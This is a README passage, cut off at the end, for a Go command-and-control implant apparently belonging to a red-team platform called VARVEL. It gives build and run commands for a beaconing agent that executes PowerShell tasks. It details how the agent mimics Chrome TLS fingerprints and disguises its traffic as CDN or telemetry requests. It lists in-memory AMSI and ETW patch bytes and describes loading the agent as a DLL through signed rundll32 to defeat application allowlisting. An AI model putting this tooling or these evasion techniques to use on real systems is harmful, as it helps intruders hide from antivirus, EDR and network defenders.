# VARVEL — NATIVE IMPLANT TIER (`agents/native/`)

A compiled Go agent for the governed callback channel. Pure Node/PowerShell agents
cannot control the TLS ClientHello (JA4) and cannot ship as a small static binary —
this tier exists to close exactly that gap, and **everything it does on the wire is
MEASURED by the platform's own oracles, never claimed.**

Status: **stage 1** (see "Honest limits" — this tier is deliberately narrow).

## What ships here

| Path | What it is |
|---|---|
| `agents/native/` | Go module `varvel-agent` (pinned deps in `go.mod`/`go.sum`) |
| `agents/native/envelope.go` | the per-hop ENVELOPE ENCRYPTION layer — byte-exact port of `engine/envelope.mjs` (HKDF-SHA256 + chacha20-poly1305), proven by live cross-decryption both directions |
| `agents/native/shape.go` | the SHAPING PACK v2 port — the profile library (`plain`/`cdn-asset`/`software-update`/`telemetry-beacon`), channel-delivery resolution, the ordered wire-header builder, cadence/batch/padding math (byte-exact vs `engine/malleable.mjs`, parity-vector pinned) |
| `agents/native/shapehttp.go` | the ORDERED-HEADER HTTP/1.1 emitter — the JA4H-correctness mechanism (net/http sorts headers; this serializes the request by hand in template order) |
| `agents/native/varvel-agent.exe` | the compiled agent (build artifact; rebuild per below) |
| `agents/native/ja4/` | pure-Go client-JA4 observer leg — a faithful port of `engine/fingerprint.mjs` (`parseClientHello` + `ja4`), cross-validated against it |
| `agents/native/harness/capture-hello.mjs` | Node-side JA4 observer: captures the compiled binary's real ClientHello, fingerprints it with the platform oracle |
| `agents/native/harness/tls-observe.mjs` | negotiated-truth observer: real h2-capable TLS server recording ALPN / TLS version / cipher / HTTP version / channel headers per profile |
| `agents/native/harness/enc-vectors.mjs` | envelope PARITY-VECTOR harness: `emit` prints the Node engine's derived key + real sealed blobs/strings for a fixed vector set; `open <file>` opens the Go side's sealed output (the reverse direction) — both driven live by `envelope_test.go` |
| `agents/native/evasion_windows.go` | the EVASION INTERNALS TIER ported to native — own-process in-memory `amsi.dll!AmsiScanBuffer` / `ntdll.dll!EtwEventWrite` patches, snapshot-first / patch-verified / restorable, emitting the PS host's exact evidence JSON (see "Evasion tier" below) |
| `agents/native/harness/shape-observe.mjs` | JA4H PARITY harness: `judge <profile> <capture.json>` fingerprints one captured Go wire request with the platform oracle and asserts it byte-equal against the profile's `expectedJa4h`; `run <exe> <profile>` spawns the compiled binary (`-shape`) against a rawHeaders-recording stub and judges pull AND push — driven live by `shapehttp_test.go` |
| `test/native-agent.test.mjs` | guarded integration test (`VARVEL_NATIVE_IT=1`), registered in `package.json` — skips cleanly without the guard (see "Test registration") |

## Toolchain (portable Go, exclusion-contained)

Go 1.26.6 windows-amd64, official ZIP from `https://go.dev/dl/go1.26.6.windows-amd64.zip`.

- **Hash-verified**: published SHA256
  `5b6c5b556525810463b5c897b50dc7a82d6a3dc0bfaf55d990a7e9f31d6b2318`
  (from `https://go.dev/dl/?mode=json`) == `sha256sum` of the downloaded ZIP. Verified
  2026-08-18. The ZIP is kept at `../../tools/go1.26.6.windows-amd64.zip` (relative to
  the repo: the enclave `tools/` tree); delete it freely — the extracted tree is
  `../../tools/go/`.
- **No admin, no installer, no PATH change.** The toolchain is invoked by absolute path.
- **Cache containment (Defender discipline).** Go's default `GOCACHE`/`GOPATH`/
  `GOMODCACHE` live under `%LOCALAPPDATA%` — OUTSIDE the operator's Defender exclusion,
  and a Go build writes `.exe`-class artifacts there. Every `go` invocation MUST carry:

  ```bash
  T=/c/Users/Jack/Downloads/enclave/tools
  export GOCACHE=$T/gocache/cache GOPATH=$T/gocache/path \
         GOMODCACHE=$T/gocache/modcache GOTMPDIR=$T/gocache/tmp GOTOOLCHAIN=local
  ```

  (`GOTOOLCHAIN=local` additionally pins the toolchain to the extracted one — no
  auto-download.) Verified: after a full build + test cycle there is **no**
  `%LOCALAPPDATA%\go-build` at all; the contained cache holds the artifacts.

## Build

```bash
cd varvel/agents/native
# (env from above)
../../tools/go/bin/go.exe build -ldflags="-s -w" -o varvel-agent.exe .
```

Result: a **static, self-contained** Windows PE (Go produces no libc/DLL dependency on
windows/amd64; no cgo is used). Measured size: **8,615,424 bytes** with
`-ldflags="-s -w"` (2026-08-24, with the evasion tier; was 8,484,864 with the
shaping pack, 8,437,760 with the envelope layer, 8,429,056 before it).
For contrast: `node.exe` alone is ~95 MB and the sim agent additionally needs the
whole `varvel/` tree on disk.

### Dependencies (fetched at BUILD time only — the binary is static)

Pinned in `go.mod`/`go.sum`; fetched from `proxy.golang.org` into the contained
`GOMODCACHE` (recorded 2026-08-18):

- `github.com/refraction-networking/utls v1.8.2` (direct — the ClientHello control layer)
- `golang.org/x/net v0.38.0` (direct — `http2` for the ALPN-selected h2 leg; already in
  uTLS's own module graph)
- `golang.org/x/crypto v0.36.0` (direct since 2026-08-19 — `chacha20poly1305` + `hkdf`
  for the envelope layer; the ONLY go.mod edit the enc port needed was the
  indirect→direct reclassification via `go mod tidy` — **no version moved**)
- `golang.org/x/sys v0.31.0` (direct since 2026-08-24 — `windows.VirtualProtect` +
  the LazyDLL resolver for the evasion tier; same reclassification discipline,
  **no version moved**)
- build-graph modules pulled by those: `github.com/andybalholm/brotli v1.0.6`,
  `github.com/klauspost/compress v1.17.4`,
  `golang.org/x/text v0.23.0` (indirect)

`go.sum` is committed in this directory — it IS the fetch record.

## Running

```
varvel-agent.exe -url http://127.0.0.1:PORT -id AGENTID -token TOKEN
  [-interval 2000] [-jitter 1500] [-tls-profile chrome] [-once] [-dir SANDBOX] [-tls-insecure] [-enc] [-shape plain] [-allow-evasion]
```

- `-url` — channel base. `http://` = the channel's plaintext wire (the reference
  listener is plaintext HTTP). `https://` = dial through the `-tls-profile` ClientHello.
- `-id` / `-token` — issued **channel-side** at registration (`registerAgent`); there is
  no wire enrollment by design. CLI args are visible in the process list — same caveat
  the sim agent documents.
- `-tls-profile chrome` (default) — uTLS `HelloChrome_Auto`. `go-native` — stock
  `crypto/tls` (the measured contrast leg).
- `-tls-insecure` — skips server-cert verification. **LAB ONLY** (the range's
  self-signed fixtures); it logs a loud warning at launch.
- `-enc` — envelope encryption (default OFF; the sim agent's `--enc 1` parity):
  AEAD-seal every result body end-to-end (chacha20-poly1305, HKDF key from the agent
  token), advertise the capability as `x-varvel-enc: 1` on every pull, and REQUIRE
  sealed task replies — a plaintext reply is a downgrade: refused loudly, never tasked
  from. The channel's `enc.mode` gates the listener half; both halves fail loud (an
  enc agent against an `off` channel gets plaintext replies and refuses them; against
  a `required` channel a plaintext agent is 204-uniform refused).
- `-shape` — launch-time wire shape (default `plain` = today's minimal wire):
  `cdn-asset` | `software-update` | `telemetry-beacon`, the same library
  `engine/malleable.mjs` ships. The agent adopts the profile's shaped request paths,
  ORDERED header set (JA4H-correct — see "Shaping pack" below), UA family, cadence
  model, batch windows and padding. A channel-delivered `x-varvel-shape` header
  (operator `setShapeProfile`) re-shapes or clears the agent LIVE, exactly like the
  sim agent — the flag is only the pre-delivery fallback. Unknown names are refused
  loudly at launch, never silently reshaped.
- `-allow-evasion` — the agent-side half of the EVASION tier's double gate (default
  OFF; sim-agent `--evasion` / PS-agent `-AllowEvasion` parity): permits the
  `evasion-enable` / `evasion-restore` / `evasion-status` task kinds to patch THIS
  agent's OWN process memory (amsi/etw recipes — see "Evasion tier" below). The
  engagement's `exec.evasion` setting is the channel-side half; BOTH must say yes or
  nothing is ever patched. The DLL form's equivalent is the config key
  `"allowEvasion": true`. The launch line reports the gate state honestly
  (`evasion ARMED (-allow-evasion…)` / `evasion OFF (default…)`).
- Task set (honest minimal): `note`, `echo`, `shell` (a **PowerShell child** —
  `powershell.exe -NoProfile -NonInteractive -Command`, cwd-locked to the sandbox dir,
  20s timeout, 60KB combined-output cap — the sim agent's numbers; the sim agent's
  `shell` goes through `cmd.exe` instead, a documented interpreter difference), plus
  the GATED `evasion-*` kinds below. Anything else answers
  `unknown task kind: <kind>` — loud, never a silent drop.

## Wire parity notes (what "speaks the existing http channel" means, byte-for-byte)

Ported from `agents/sim-agent.mjs` against the listener's intake
(`engine/callback.mjs` `_handle`):

- **Pull**: `GET {url}/c`, headers `x-agent`, `x-seq`,
  `x-auth = HMAC-SHA256hex(token, id:seq:pull)`. `204` = idle **or any rejection**
  (204-uniform: unknown/killed/bad-auth/stale-seq are indistinguishable from idle by
  design). `200` = `{taskId,kind,data}` or `{batch:true,tasks:[...]}`.
- **Push**: `POST {url}/r`, headers `x-agent`, `x-seq`, `x-task`, raw body,
  `x-auth = HMAC-SHA256hex(token, id:seq:taskId:sha256hex(body))`. `200` = accepted.
- **Seq is agent-global and strictly increasing across pulls AND pushes** (one counter,
  never per-route). Proven by an integration test whose result only lands if the push
  seq advanced past the pull seq.
- **Kill-list**: enforced server-side by silence; the agent cannot tell killed from
  idle (that IS the contract). Test: post-kill, the checkin counter freezes and a
  queued task is never delivered (`task()` refuses killed agents channel-side).
- **Cross-implementation vectors**: the HMAC/SHA256 test vectors in `wire_test.go` were
  computed once by Node (the listener's own crypto) and pinned; Go asserts equality.
  The JA4 observer leg is validated the same way (same input bytes → same fingerprint
  string in Go and in `engine/fingerprint.mjs`). The envelope layer goes further —
  LIVE cross-decryption both directions, see "Envelope encryption" below.
- **Envelope encryption: SUPPORTED (2026-08-19).** `envelope.go` is a byte-exact port
  of `engine/envelope.mjs` (HKDF-SHA256 key hierarchy, chacha20-poly1305 AEAD, the
  `'VE'‖0x01‖nonce12‖ct‖tag16` blob and `'enc1:'+base64url` string forms,
  encrypt-then-MAC — the HMAC signs the ciphertext). Off by default; `-enc` turns the
  agent into a full enc peer: `x-varvel-enc: 1` capability on every pull, sealed push
  bodies, sealed task replies required (plaintext = loud downgrade refusal), exactly
  the sim agent's `--enc 1` semantics on the http wire (this tier's only leg).
- **No client-side chunking on the http wire — by the wire's own design.** The `/r`
  intake is single-shot up to `MAX_BODY` (4 MB); chunked per-chunk-HMAC reassembly
  exists only on the dns/ws/stg codec wires (`{a,s,h,t,k:'push',i,n,d}`), which this
  tier does not implement. Exec results are capped at 60 KB (sim-agent parity), so the
  payload never demands chunking on this wire. If the native tier ever grows a codec
  leg, chunking comes with it.
- **Shaping pack v2: SUPPORTED (2026-08-24).** The agent adopts the channel-delivered
  `x-varvel-shape` profile (and the launch-time `-shape` fallback) — shaped paths,
  the ORDERED header set, cadence model, batch/dwell windows, padding. See the
  "Shaping pack" section below for the mechanism and the measured-parity proof.
- **Not adopted** (documented absences, never silently pretended): the legacy timing
  profiles (`x-varvel-profile` — the shape cadence supersedes it when a shape is
  armed), channel-assigned transport failover (`x-varvel-transport`),
  fetch/stage, link/socks/inline/persist kinds. An UNSHAPED native agent's
  wire requests are the minimal governed shape — which the fporacle HTTP observer
  flags as `FP-HTTP-MINIMAL`/`FP-XHEADERS`, exactly as it does for the sim agent.
  That is a measured fact of the governed wire, not a defect to hide.

## Envelope encryption — the parity PROOF (both directions, live)

`agents/native/harness/enc-vectors.mjs` extracts REAL vectors from the Node engine
(`engine/envelope.mjs`) for a fixed token/agentId/payload set, and `envelope_test.go`
drives both directions inside `go test` (skipped cleanly if no `node` on PATH):

- **Key**: HKDF-SHA256(ikm=token, salt `varvel-envelope-v1`, info `varvel-env:`+agentId,
  32B). Node emitted `e2eeb517214f26fc7a8aba033e46f81132dc40cce50b758f8393261631de6e2d`
  for the vector set; Go's `deriveEncKey` reproduces it exactly.
- **Node → Go**: Go opens every Node-sealed blob and string (task-reply JSON, echo
  result, unicode, empty, a 256-byte binary blob). Verified open-by-open in
  `TestEnvelopeNodeParity` (`Node→Go opened task-reply blob(115b) + string`, …).
- **Go → Node**: Go seals the same set; the harness's `open` mode opens each with the
  Node engine — `{"ok":true,"opened":[task-reply:blob/string, result-echo:blob/string,
  unicode:blob/string, empty:blob/string, binary:blob], "plaintextChecked":4}`.
- **Plaintext detection parity**: plaintext task JSON, a bare `enc1` near-miss, a
  short `'VE'`-magic buffer, and the empty string read as NOT sealed on BOTH sides.
- **Wire proof** (`VARVEL_NATIVE_IT=1 node --test test/native-agent.test.mjs`, the enc
  leg): against a real `CallbackChannel` in enc.mode `required` + the compiled agent
  with `-enc` — check-in with `ec:1` (ratchet audited `enc.negotiated`), sealed task
  down (raw probe: body is `'enc1:…'` and opens to the task JSON channel-side), sealed
  result up, plaintext pull AND push refused (204-uniform + ledger `enc-required` ×2).
- The base64url form is padding-free (`base64.RawURLEncoding` == Node `base64url`) and
  the AEAD carries NO AAD and NO cipher-level sequence state — replay stays with the
  HMAC layer's strict seq, key-rotation-safe, exactly as `engine/envelope.mjs` specifies.

**Residual honesty**: enc seals CONTENT, not SHAPE — sizes, cadence, and header shape
stay observable. On an unshaped agent that shape is the minimal-header one (flagged
`FP-HTTP-MINIMAL`/`FP-XHEADERS`); the shaping pack below covers the shape axis. One
measured interaction, reported not hidden: the JA4H CLAIM (`expectedJa4h`) is computed
for the non-enc wire, and an enc agent's capability header rides after `x-auth`
(sim-agent insertion order) — so an enc+shape combination measures ONE header over
the claim and shapegrade reports that divergence. That is the platform working.
Channel-delivered legacy timing profiles (`x-varvel-profile`) and channel-assigned
JA4/transport adoption remain unimplemented (JA4 control is launch-time
`-tls-profile` only).

## Shaping pack (v2) — the wire SHAPE, adopted and MEASURED

The last stealth-wire gap on this tier is closed: the native agent adopts the
malleable shape profiles (`engine/malleable.mjs` SHAPE_PROFILES) the same way the sim
agent does, plus a launch-time fallback:

- **Channel-delivered**: the `x-varvel-shape` header on every check-in reply
  (204s included) carries the resolved profile as compact JSON; the agent adopts it
  on the spot (`shape adopted: <name>` on stderr), re-anchors on the delivered `at`,
  and a `{name:"plain"}` delivery CLEARS back to today's minimal wire. Unknown or
  malformed payloads change nothing (the sim agent's `catch{}` semantics).
- **Launch-time**: `-shape cdn-asset|software-update|telemetry-beacon` resolves
  against the embedded library (a verbatim port of the Node one) — the very first
  request is already shaped. Unknown names are a loud launch refusal.

What adoption drives, sim-agent parity each:

- **Request template** — pulls ride a random `pullPaths` entry with the cache-busting
  `?queryKey=<4 bytes hex>`; pushes ride `pushPaths`. Headers are the profile's
  template in ORDER, `{ua}` filled from the UA pool, then the auth headers, then the
  same runtime-default append sequence the platform's `expectedWireHeaders` models
  (`accept → accept-language → sec-fetch-mode → user-agent → accept-encoding`;
  `sec-fetch-mode` forced to `cors` in place; `content-length` LAST on POST).
- **Cadence** — the profile's `nextGap` port: proportional jitter
  (`gap = round(interval * (1 ± pct*r))`, 200ms floor) with bursts (`chance` →
  `minN..maxN` quick cycles at `gapMs` spacing).
- **Batch/dwell windows** — with `batch.windowMs` armed, the loop dwells to the
  seeded flush point BOTH sides derive independently from the shared token
  (`windowFlushAt = anchor + i*window + floor(uint32BE(HMAC-SHA256(token,
  'varvel-batch:'+i)[0:4]) / 2^32 * window)`); the channel holds queued tasks until
  that point and flushes them as ONE batched reply (`batch:true`), which this agent
  executes in order. Batch takes precedence over cadence/padding exactly like the
  sim agent (they never mix).
- **Padding** — with `padding.perCycle` armed, `perCycle-1` dummy envelopes spread
  across each cycle's gap: same wire shape as a pull, but the `:pad` HMAC context —
  the channel audits each as `agent.pad`, answers 204, and never delivers tasks on
  one. Pads consume the agent-global seq like any envelope.

### The header-order mechanism (why net/http could not do this)

JA4H (`engine/fingerprint.mjs`) hashes the request's header NAMES **in wire order**,
and Go's `net/http` cannot emit a chosen order: `Request.write` writes Host and
User-Agent itself, then emits every remaining header ALPHABETICALLY
(`Header.writeSubset` sorts the keys) with canonicalized case — below the
RoundTripper seam, so no wrapper can fix it. The agent therefore ships a **purpose
ordered emitter** (`shapehttp.go`, the same doctrine as `tlsp.go`'s purpose TLS
RoundTripper): dial the connection, SERIALIZE THE REQUEST BY HAND — request line,
then `name: value` pairs in exactly the order `shape.wireHeaders` built (a
byte-port of `expectedWireHeaders` with real values filled), then the body — and
parse the reply with `http.ReadResponse`. Header order and case on the wire are
byte-exact the string the platform oracle's `expectedJa4h` is computed over.

**HTTPS leg (honest cost, measured):** an ordered HTTP/1.1 byte stream only exists
when the negotiated protocol IS http/1.1, so the shaped https leg constrains ALPN to
`["http/1.1"]` (uTLS chrome hello or stock crypto/tls per `-tls-profile`). On a
shaped https wire the JA4 `_a_` ALPN digit therefore reads `h1`, not the `h2` the
unshaped chrome leg offers — reported, never smoothed. Still no connection pooling
(fresh handshake per request). The reference channel listener is plaintext HTTP/1.1,
where none of this bites.

### Measured parity (the platform's discipline, asserted in tests)

JA4H — the Go wire bytes fingerprinted by the platform oracle and asserted
**byte-equal against the profile's claim** (`shapehttp_test.go` drives
`harness/shape-observe.mjs judge`; `run` mode covers the compiled binary; the
integration test covers the governed channel end-to-end):

| profile | pull (GET) | push (POST) |
|---|---|---|
| `cdn-asset` | `ge11nn12enus_0229f49be981_000000000000_000000000000` | `po11nn14enus_6c6270e42d20_000000000000_000000000000` |
| `telemetry-beacon` | `ge11nn10enus_56e6806eaf2a_000000000000_000000000000` | `po11nn12enus_00bbb15da1c5_000000000000_000000000000` |
| `software-update` | `ge11nn10*000_a5e90d4b5302_000000000000_000000000000` | `po11nn12*000_081f471d0fe3_000000000000_000000000000` |

Window math — `windowIndexAt`/`windowOffsetMs`/`windowFlushAt` parity vectors
computed ONCE by the Node engine and pinned in `shape_test.go` (token
`a1b2…8f90`, anchor `1700000000000`, window `30000`): offsets `15190, 11558, 16466,
27883, 16362, 4121` for windows `0..5` (flush points `…0015190, …0041558, …0076466,
…0117883, …0136362, …0154121`), plus a second window size (`5000` → `2531, 1926,
2744`). Same seed ⇒ same boundaries in Go and Node, or the test goes red.

Integration (`VARVEL_NATIVE_IT=1 node --test test/native-agent.test.mjs`) proves the
governed loop end-to-end: `setShapeProfile('cdn-asset')` delivered over the wire ⇒
the Go agent adopts, shaped check-ins arrive on the shaped paths, and
`engine/shapegrade.gradeShape` over the channel's own fporacle ring returns
`verdict: 'measures-as-claimed'` (`ja4h-pull` check `match`, zero divergent) — plus
a batch-window leg (2 held tasks flushed as one burst, never before the seeded
point) and a padding leg (`agent.pad` audits).

## JA4 control — the centerpiece, MEASURED

Two independent observer legs, two implementations, same strings:

- pure-Go: `agents/native/ja4` (port of the platform oracle) over loopback-captured
  bytes (`go test -run TestJA4ProfilesDiffer -v .`)
- platform oracle: `node agents/native/harness/capture-hello.mjs <binary> <profile>`
  (`engine/fingerprint.mjs` over the compiled binary's real wire bytes)

**Measured 2026-08-18** (go1.26.6, uTLS v1.8.2, SNI=name present, ALPN h2 first):

| profile | JA4 (measured) |
|---|---|
| `-tls-profile chrome` (uTLS HelloChrome_Auto) | `t13d1516h2_8daaf6152771_d8a2da3f94cd` |
| `-tls-profile go-native` (stock Go 1.26.6) | `t13d1312h2_f57a46bbacb6_ab7e3b40a677` |

Against the **documented Chrome reference** — FoxIO's JA4 README example row,
`JA4=t13d1516h2_8daaf6152771_02713d6af862` (Chrome, TCP), corroborated by FoxIO issue
#31 (Chrome 120 + ECH GREASE: `t13d1517h2_8daaf6152771_b1ff8ab2d16f`):

- `_a_` = `t13d1516h2` — **exact match** (TLS 1.3, SNI present, 15 ciphers, 16
  extensions, ALPN h2).
- `_b_` = `8daaf6152771` — **exact match**: the stable Chrome cipher-list hash.
- `_c_` = `d8a2da3f94cd` — **drifts** from the README's `02713d6af862` (extension set +
  sigalgs churn per Chrome vintage; FoxIO themselves note JA4s change "about once a
  year" as TLS libraries update). Reported as measured, never asserted equal to a
  stale string. The captured extension set includes ECH GREASE (`fe0d`), an extension
  permutation (`44cd`) and RFC 8701 GREASE — the current-Chrome wire traits.

A matching JA4 string is **string equality with a reference**, never a claim of
indistinguishability (the fporacle honesty contract). The HTTP-layer shape (JA4H) is
a separate measurement with its own section above: an unshaped agent's governed
headers are the minimal channel shape (flagged scripted-client by the platform's own
observer), and a shaped agent's wire measures byte-equal against the profile's claim
— both asserted, never assumed.

**ALPN / negotiated behavior, measured** (`harness/tls-observe.mjs`, and
`tlsp_test.go` against an in-process h2 server):

| profile | ALPN offered | vs h2-capable server | request version |
|---|---|---|---|
| chrome | `h2, http/1.1` | negotiates `h2`, TLSv1.3, `TLS_AES_256_GCM_SHA384` | HTTP/2.0 |
| go-native | `h2, http/1.1` | negotiates `h2`, TLSv1.3, `TLS_AES_256_GCM_SHA384` | HTTP/2.0 |

Engineering note (measured, then fixed): Go's `net/http` cannot drive h2 over a uTLS
conn — with a custom TLS dialer it reads ALPN state only from a concrete `*tls.Conn`
(go1.26.6 `transport.go:1795`), so a uTLS conn silently degrades to HTTP/1.1 written
onto an h2-selected connection (the server answers with h2 frames; the exchange
breaks). The agent therefore uses a purpose `RoundTripper` (`tlsp.go`) that reads the
negotiated ALPN off the uTLS conn and speaks exactly that protocol (`x/net/http2`
`NewClientConn` for h2, a bare HTTP/1.1 exchange otherwise). Honest cost: **no
connection pooling on the https+chrome leg** — every request is a fresh TCP+TLS
handshake (a flow-shape difference vs a real browser's reuse; recorded here, not
hidden). The go-native leg pools normally.

## Sleepmask / UDRL honesty — what stage 1 is NOT

Go has a managed runtime: a stop-the-world-capable GC, goroutine stacks that grow and
shrink, finalizers, and a scheduler that touches memory while "idle". **True
sleepmask-class memory encryption during sleep is not honestly deliverable in Go** —
you cannot encrypt the image of a runtime that keeps rewriting its own heap between
your hook and the resume. This tier does not attempt it, does not simulate it, and
does not claim it.

- **Stage 1 (this build) delivers**: a small static exe (no Node runtime, no script
  content on disk or in a script engine — so **no AMSI script-content visibility for
  its own process**, because there is no script content to scan — the property the
  evasion port below is built on); no PowerShell/Node footprint for the agent process
  itself (a `shell` task still spawns a powershell child — visible, documented,
  cwd-confined); governed wire parity with the sim agent; **measured** ClientHello
  (JA4) control; and the gated own-process evasion tier (next section).
- **Stage 1 does NOT deliver**: in-memory encryption at rest (sleepmask), UDRL-style
  custom loading, syscall-level evasion, reflective anything. The honest stage-2 path
  for sleepmask-class behavior is a Rust/C core without a managed runtime — the
  public Ekko/Foliage lineage of sleep-obfuscation techniques — possibly as a
  cgo-free sibling core this Go agent could shell out to, or a full rewrite of the
  implant core. That is a separate, measurable build; nothing about it is implied by
  this stage.

## Evasion tier (own-process AMSI/ETW) — the PS-tier port, DLL-carried

**Why this port exists (field-measured 2026-08-24, range day #1):** the PowerShell
agent's evasion recipes are **AMSI-signatured at script parse** on the range
(`VirTool:PowerShell/Ambypaz.B!MTB` quarantines the script before it runs) — a
script cannot carry its own patch recipe past a script scanner. This is a
chicken-and-egg property of script-carried evasion, not of the recipes: the same
bytes carried in a COMPILED binary never pass a script parser at all. A DLL loaded
via a signed host (the execproxy tier below) — or the exe directly — patches **its
own process** without a byte of script being scanned.

`agents/native/evasion_windows.go` is a faithful Go port of the PS tier's
`==EVASION-LIB==` block (`agents/evasion-host.ps1`), governed by the SAME
`engine/evasion.mjs` (spec parse, gate, evidence model — all unchanged):

- **Techniques** (the well-published public byte strings, hash-pinned
  cross-implementation against `EVASION_RECIPES` in `evasion_windows_test.go`):
  `amsi` = in-memory `amsi.dll!AmsiScanBuffer` patch (`mov eax,0x80070057; ret` —
  E_INVALIDARG, the scan fails before content is evaluated); `etw` = in-memory
  `ntdll.dll!EtwEventWrite` success-noop (`mov eax,0; ret`).
- **Discipline** (ported verbatim in spirit): snapshot the original bytes FIRST
  (their sha256 is the evidence); exact-span write through `VirtualProtect`; re-read
  byte-compare PROOF; restore writes the snapshot back and re-verifies. Failures are
  typed and loud — a failed restore is never dressed up as success.
- **Verification, measured not claimed**: for `amsi`, the OFFICIAL Microsoft test
  string is scanned in-process through the real AMSI provider chain before AND after
  (blocked → clear on enable, and the clear → blocked flip-BACK on restore — both
  measured). For `etw` the Go port ADDS the probe the PS tier documented as out of
  its reach: after the byte-proof, the patched export is CALLED in-process with null
  args and must return `ERROR_SUCCESS` immediately (safe by byte-proof — the body is
  `mov eax,0; ret`, it touches nothing). ETW restore stays byte-verify-only on
  purpose: calling the REAL `EtwEventWrite` with fabricated null args risks a
  null-descriptor dereference, so the byte proof stands there.
- **Idempotent enable/restore.** Re-enable on a live patch re-verifies the bytes and
  KEEPS the original snapshot as the only restore source — the PS tier silently
  re-snapshots there, which would record the patch bytes as "original" and make
  restore put the patch back; this port refuses that construction, and reports a
  live-region mismatch as `tampered` (status) / a loud `failed` (re-enable).
- **Double gate, fail-closed** (both halves, exactly like the PS/sim tiers): the
  channel refuses to queue `evasion-*` unless the engagement enabled `exec.evasion`
  (default OFF; `evasion.task` audits the recipe sha256 at queue time), and the agent
  refuses unless launched with `-allow-evasion` (exe) / `"allowEvasion": true` (DLL
  config). A refusal is loud plain text and produces NO evidence event; an attempt
  returns the SAME op-first evidence JSON the PS host emits —
  `engine/evasion.mjs parseEvasionEvidence` parses it UNCHANGED (asserted live in the
  integration leg, including `pid == the rundll32 host's pid`: the patch provably
  landed in the signed host process).
- **Detoracle phrasing contract (absolute):** verdicts measured under an active patch
  read `monitoring neutralized (self-reported, patch-verified)` — NEVER `clean`
  (`tools/detoracle.mjs honestVerdict`; the native evidence feeds the same
  `assessEvasion` loop through the same kinds).

**Static-visibility cost — measured, not hidden.** Resolving via GetProcAddress means
the API/export names sit in the binary as plain UTF-8 (Go has no string obfuscation;
`-s -w` strips symbols, NOT literals). Measured 2026-08-24 against a same-module
baseline binary built WITHOUT the evasion tier (the dllprobe harness, 1,691,648
bytes):

| string | baseline | exe | dll |
|---|---|---|---|
| `AmsiScanBuffer` / `EtwEventWrite` / `AmsiScanString` | 0 | 2 | 2 |
| `VirtualProtect` | 0 | 4 | 6 |
| `amsi.dll` / `AmsiInitialize` | 0 | 1 | 1 |
| `ntdll.dll` | 2 (the Go runtime itself) | 2 | 2 |

The script tier is signatured at PARSE (always, on the recipe content); this tier is
signatured at REST (a file scanner matching API-name strings — one weak static
signal, reported here in counts, never hidden).

**Honest residual.** Behavior detection of the patch itself by a kernel-level EDR is
OUT of AMSI's userland scope — an EDR that watches `VirtualProtect` on its own
process's `amsi.dll` or compares ntdll text against the mapped image sees the patch;
`edrview` grades what actually gets recorded on the range. The ETW patch suppresses
THIS process's own ETW writes only; kernel and other-process providers are
untouched. All patch state is in-memory and own-process: process exit is the
ultimate restore, by construction.

**Measured live (2026-08-24, this host, `VARVEL_NATIVE_IT=1`):** the DLL form built
fresh, loaded by Microsoft-signed `rundll32.exe`, channel-driven
status → enable(amsi,etw) → status → restore → status — amsi flip
`blocked -> clear -> blocked` both directions proven, etw byte-proven + noop-called,
restore hashes == original hashes, and every evidence body parsed by the real
`parseEvasionEvidence` unchanged. Scanning the official test string and patching
AMSI in-process may raise a real Defender alert on the box — EXPECTED, and itself
the measurement (not suppressed).

## DLL form (`varvel-agent.dll`) — the SIGNED-PROXY EXECUTION payload

The same agent core (agent.go / wire.go / tlsp.go — wire, HMAC, strict seq, sandbox
exec containment are shared verbatim) also builds as a **c-shared DLL** for the
signed-proxy execution tier (governance: `engine/execproxy.mjs`; operator guide:
docs/AGENT-GUIDE.md). It exists for THE WALL: behind application allowlisting
(WDAC/AppLocker) the unsigned exe never runs, so a Microsoft-SIGNED host binary
loads this DLL and runs our logic.

Build (cgo REQUIRED — the ONLY cgo build in the module; the exe stays cgo-free.
`CC` is the box's mingw gcc; caches stay contained as above):

```bash
cd varvel/agents/native
CGO_ENABLED=1 CC='C:\msys64\mingw64\bin\gcc.exe' \
  ../../tools/go/bin/go.exe build -tags varveldll -buildmode=c-shared \
  -ldflags="-s -w" -o varvel-agent.dll .
```

Mechanics: `-tags varveldll` swaps the CLI `main` (tagged `!varveldll`) for a no-op
(`main_dll.go` — a DLL must never parse args or `os.Exit` on load; that would kill
the signed host) and compiles `proxydll.go` (the cgo export shim) +
`proxyconf.go` (the pure JSON config parse — covered by `proxyconf_test.go`, no cgo
needed). Measured size: **8,642,560 bytes** stripped (2026-08-24, with the evasion
tier — the DLL gains the enc + shape + evasion code for free via the shared package,
and the `VarvelRun` config JSON mirrors the exe flags one-for-one, `"enc": true`,
`"shape": "cdn-asset"` and `"allowEvasion": true` included; the run note on stderr
reports the evasion gate state honestly before the loop starts).

Exported C ABI (deliberately minimal):

| export | signature | behavior |
|---|---|---|
| `VarvelStatus` | rundll32 prototype `(hwnd,hinst,lpCmdLine,nCmdShow)` | drops ONE small status-marker JSON (`{"marker":"varvel-agent-dll","pid":<host pid>,...}`) at the path in its command tail (or beside the DLL when no tail) and **returns immediately** — the recon/proof leg. Never starts the C2 loop. |
| `VarvelRun` | `(char* configJson) -> int` | the **blocking** agent loop; config is inline JSON or `@<path>` (`{"url","id","token","interval"?,"jitter"?,"dir"?,"tlsProfile"?,"once"?,"tlsInsecure"?,"enc"?,"shape"?,"allowEvasion"?}`). Returns 0 / 2 (bad config) / 3 (client build). |
| `VarvelRunR` | rundll32 prototype | `VarvelRun` with the config in the command tail (e.g. `rundll32 dll,VarvelRunR @C:\...\run.json`). |
| `DllRegisterServer` / `DllUnregisterServer` | `(void) -> 0` | regsvr32-class: return S_OK and do NOTHING else by design (no self-registration side effects). |

**Measured host behaviors (2026-08-18, Win11 24H2 26200.9168 — reported, not smoothed):**

- **rundll32-class works and exits cleanly** — with two discovered-on-this-box
  caveats baked into the tier: (1) rundll32 re-parses its own command line and
  **declines the load when the `<dll>,<Export>` token is QUOTED** (the leading
  quote becomes part of the DLL name on its parse path) — the agent-side host
  therefore passes unquoted tokens and **refuses space-containing paths loudly**;
  (2) the DLL **self-pins at load** (`GetModuleHandleExW(FROM_ADDRESS)` without
  `UNCHANGED_REFCOUNT`) because a Go runtime cannot be unloaded — without the pin
  the host's `FreeLibrary` delivers `DLL_PROCESS_DETACH` and rundll32 fast-fails
  `0xC0000409` AFTER the export returns.
- **regsvr32-class is load-only**: the load and the `DllRegisterServer` call
  happen (S_OK when invoked directly), but regsvr32.exe reports a nonzero exit
  anyway and can linger at teardown — rundll32-class is the clean leg; regsvr32 is
  documented, not dressed up.
- The **load-and-ran proof** is the marker file (written by our code, carrying the
